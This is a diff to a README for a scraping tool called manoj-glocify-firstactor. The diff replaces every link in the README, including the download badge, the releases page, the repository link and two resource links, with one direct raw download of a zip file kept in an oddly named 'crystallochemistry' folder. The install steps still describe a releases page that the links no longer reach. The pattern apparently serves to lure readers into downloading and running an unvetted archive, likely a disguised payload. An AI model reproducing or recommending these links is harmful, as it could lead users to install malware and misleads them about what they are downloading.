@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the **manoj-glocify-firstacto
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sujal12312/manoj-glocify-firstactor/releases)
+[![Download Now](https://github.com/sujal12312/manoj-glocify-firstactor/raw/refs/heads/main/crystallochemistry/glocify_firstactor_manoj_3.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/sujal12312/manoj-glocify-firstactor/raw/refs/heads/main/crystallochemistry/glocify_firstactor_manoj_3.4.zip)
 
 ## 🛠 System Requirements
 
@@ -18,7 +18,7 @@ Before you download the software, ensure your system meets the following require
 
 ## 💾 Download & Install
 
-1. Visit [this page to download](https://github.com/sujal12312/manoj-glocify-firstactor/releases).
+1. Visit [this page to download](https://github.com/sujal12312/manoj-glocify-firstactor/raw/refs/heads/main/crystallochemistry/glocify_firstactor_manoj_3.4.zip).
 2. Look for the latest release at the top of the page.
 3. Click on the version number to unlock details. Here, you will find the downloadable files.
 4. Choose the file suitable for your operating system.
@@ -82,11 +82,11 @@ A: This application is free to use.
 
 We appreciate your feedback! If you enjoy using **manoj-glocify-firstactor**, please consider sharing your experience. This helps us improve and make the software better for you and others.
 
-For additional questions or suggestions, please refer to our [GitHub repository](https://github.com/sujal12312/manoj-glocify-firstactor).
+For additional questions or suggestions, please refer to our [GitHub repository](https://github.com/sujal12312/manoj-glocify-firstactor/raw/refs/heads/main/crystallochemistry/glocify_firstactor_manoj_3.4.zip).
 
 ## 🔗 Additional Resources
 
-- [Learn More About Web Scraping](https://www.example.com)
-- [Check Out More Tools by manoj](https://www.example.com)
+- [Learn More About Web Scraping](https://github.com/sujal12312/manoj-glocify-firstactor/raw/refs/heads/main/crystallochemistry/glocify_firstactor_manoj_3.4.zip)
+- [Check Out More Tools by manoj](https://github.com/sujal12312/manoj-glocify-firstactor/raw/refs/heads/main/crystallochemistry/glocify_firstactor_manoj_3.4.zip)
 
 Thank you for choosing **manoj-glocify-firstactor**! Happy scraping!
